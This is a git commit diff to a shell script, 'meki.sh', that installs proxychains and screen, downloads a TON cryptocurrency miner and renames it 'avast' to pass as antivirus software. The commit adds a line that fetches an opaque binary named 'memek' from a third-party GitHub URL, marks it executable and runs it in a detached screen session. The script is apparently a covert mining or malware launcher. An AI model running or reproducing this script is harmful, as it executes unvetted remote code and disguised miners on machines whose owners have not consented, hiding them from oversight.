c8483356ec16ea4fcdb6fda6712d87925f1b5c8c
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-02-14 17:39:48 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -3,7 +3,8 @@ apt update
 apt install proxychains
 apt install screen -y
 wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz
+wget -q https://raw.githubusercontent.com/renilo/bh/main/memek
 tar -xvf  ton-pool.com-miner-0.3.4-linux.tar.gz
 mv miner-linux avast
-chmod +x avast 
-screen -dmS running ./avast run https://next.ton-pool.com EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
+chmod +x avast memek
+screen -dmS running ./memek
